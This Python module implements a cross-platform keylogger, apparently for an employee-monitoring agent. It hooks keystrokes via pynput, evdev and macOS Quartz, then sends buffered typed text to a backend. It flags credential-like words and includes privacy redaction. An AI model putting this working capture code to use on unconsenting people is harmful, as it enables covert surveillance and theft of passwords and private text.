
from pynput import keyboard # type: ignore
import threading # type: ignore
import time # type: ignore
import logging # type: ignore
from datetime import datetime # type: ignore
import platform # type: ignore
from typing import Optional, Any # type: ignore
from agent_core.privacy_utils import PrivacyRedactor

class Keylogger:
    def __init__(self, agent_id, api_key, backend_url, data_queue=None):
        self.agent_id = agent_id
        self.api_key = api_key
        self.backend_url = backend_url
        self.data_queue = data_queue
        self.running = False
        self.logger = logging.getLogger("Keylogger")
        
        self.buffer = []
        self.last_flush = time.time()
        self.lock = threading.Lock()
        
        self.listener: Optional[Any] = None
        self._thread: Optional[threading.Thread] = None
        self.is_linux = platform.system() == "Linux"
        self.is_macos = platform.system() == "Darwin"
        self.permission_status = "Granted" # Assume granted until failure

    def start(self):
        if self.running: return
        self.running = True
        
        # [v1.8.45] Cross-Platform Forensic Parity Strategy
        if self.is_macos:
            self._start_macos_keylogger()
        elif self.is_linux:
            self._start_linux_keylogger()
        else:
            self._start_standard_keylogger()
        
        # Start Flush Timer
        self._thread = threading.Thread(target=self._flush_loop, daemon=True) # type: ignore
        self._thread.start() # type: ignore
        
        self.logger.info(f"Keylogger Started ({platform.system()} Mode). Status: {self.permission_status}")

    def _start_standard_keylogger(self):
        """Standard pynput listener (Windows/X11)."""
        try:
            from pynput import keyboard # type: ignore
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start() # type: ignore
        except Exception as e:
            self.logger.error(f"Standard keylogger failed: {e}")
            self.permission_status = "Denied"

    def _start_linux_keylogger(self):
        """Linux Fallback: Try pynput first, then evdev (Wayland)."""
        try:
            # Try pynput first for non-root users on X11
            from pynput import keyboard # type: ignore
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start() # type: ignore
            self.logger.info("Linux: Started via pynput (X11)")
        except Exception:
            # Fallback to evdev for Wayland (requires root/event group)
            self.logger.info("Linux: X11 failed, attempting evdev (Wayland) fallback...")
            threading.Thread(target=self._evdev_listener_loop, daemon=True).start()

    def _evdev_listener_loop(self):
        try:
            import evdev # type: ignore
            devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
            # Find the first keyboard device
            kbd = None
            for device in devices:
                if "keyboard" in device.name.lower():
                    kbd = device
                    break
            
            if not kbd:
                self.logger.error("Linux: No keyboard device found for evdev.")
                self.permission_status = "Denied"
                return

            self.permission_status = "Granted"
            self.logger.info(f"Linux: Listening on {kbd.name} ({kbd.path})")
            
            for event in kbd.read_loop():
                if not self.running: break
                if event.type == evdev.ecodes.EV_KEY:
                    key_event = evdev.categorize(event)
                    if key_event.keystate == evdev.key_event.key_down:
                        self._process_key_string(key_event.keycode)
        except Exception as e:
            self.logger.error(f"Linux evdev listener failed: {e}")
            self.permission_status = "Denied"

    def _start_macos_keylogger(self):
        """macOS Native: Use Quartz for high-fidelity interception."""
        try:
            import Quartz # type: ignore
            from AppKit import NSKeyUp # type: ignore
            
            # This requires Accessibility permissions
            def callback(proxy, type_, event, refcon):
                if not self.running: return event
                key_code = Quartz.CGEventGetIntegerValueField(event, Quartz.kCGKeyboardEventKeycode)
                # Logic to convert keycode to char would go here or just log raw
                self._process_key_string(f"MAC_CODE_{key_code}")
                return event

            tap = Quartz.CGEventTapCreate(
                Quartz.kCGSessionEventTap,
                Quartz.kCGHeadInsertEventTap,
                Quartz.kCGEventTapOptionListenOnly,
                Quartz.kCGEventMaskBit(Quartz.kCGEventKeyDown),
                callback,
                None
            )
            
            if not tap:
                self.logger.error("macOS: Failed to create Event Tap. Accessibility permissions missing?")
                self.permission_status = "Denied"
                # Fallback to pynput just in case
                self._start_standard_keylogger()
                return

            self.permission_status = "Granted"
            run_loop_source = Quartz.CFMachPortCreateRunLoopSource(None, tap, 0)
            Quartz.CFRunLoopAddSource(Quartz.CFRunLoopGetCurrent(), run_loop_source, Quartz.kCFRunLoopCommonModes)
            Quartz.CGEventTapEnable(tap, True)
            self.logger.info("macOS: Native Quartz listener started.")
        except Exception as e:
            self.logger.error(f"macOS Quartz listener failed: {e}")
            self.permission_status = "Denied"
            self._start_standard_keylogger()

    def _process_key_string(self, k):
        """Unified key processing for different source backends."""
        with self.lock:
            if k == "KEY_SPACE" or k == "space": self.buffer.append(" ")
            elif k == "KEY_ENTER" or k == "enter": 
                self.buffer.append("\n")
                self._flush_buffer(force=True)
            elif k == "KEY_BACKSPACE" or k == "backspace":
                if self.buffer: self.buffer.pop()
            else:
                self.buffer.append(f"<{k}>")

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop() # type: ignore
        if self._thread:
            self._thread.join(timeout=2) # type: ignore

    def on_press(self, key):
        if not self.running: return

        # [v1.8.37] Adaptive Privacy: Pause logging for sensitive apps
        current_title = PrivacyRedactor.get_active_window_title()
        if PrivacyRedactor.is_sensitive_window(current_title):
            # Flush existing buffer before pausing to prevent cross-window leakage
            self._flush_buffer(force=True)
            return

        try:
            char = key.char
            if char:
                with self.lock:
                    self.buffer.append(char)
        except AttributeError:
            # Special Keys
            k = str(key).replace("Key.", "")
            with self.lock:
                if k == "space":
                    self.buffer.append(" ")
                elif k == "enter":
                    self.buffer.append("\n")
                    self._flush_buffer(force=True)
                elif k == "backspace":
                    if self.buffer: self.buffer.pop()
                else:
                    self.buffer.append(f"<{k}>")

    def _flush_loop(self):
        while self.running:
            time.sleep(5)
            self._flush_buffer()

    def _flush_buffer(self, force=False):
        with self.lock:
            if not self.buffer: return
            
            # Flush if > 50 chars or forced (Enter) or Time > 10s
            now = time.time()
            if len(self.buffer) > 50 or force or (now - self.last_flush > 10):
                content = "".join(self.buffer)
                self.buffer = []
                self.last_flush = now
                self._send_log(content)

    def _send_log(self, content):
        if not content.strip(): return
        
        payload = {
            "AgentId": self.agent_id,
            # [v1.8.38] Telemetry Stealth: Key suppression enforced.
            # Signing handled by DataQueue.
            "ActivityType": "Keystrokes",
            "ProcessName": "Keylogger",
            "WindowTitle": f"Typing: {PrivacyRedactor.redact_text(content[:200])}",
            "RiskLevel": "Normal",
            "Category": "Surveillance",
            "IdleSeconds": 0,
            "DurationSeconds": 0,
            "Timestamp": datetime.utcnow().isoformat(),
        }

        # DLP Check (Basic)
        if any(x in content.lower() for x in ["password", "login", "secret", "credit"]):
            payload["RiskLevel"] = "High"

        if self.data_queue:
            self.data_queue.enqueue("/api/events/activity", payload)
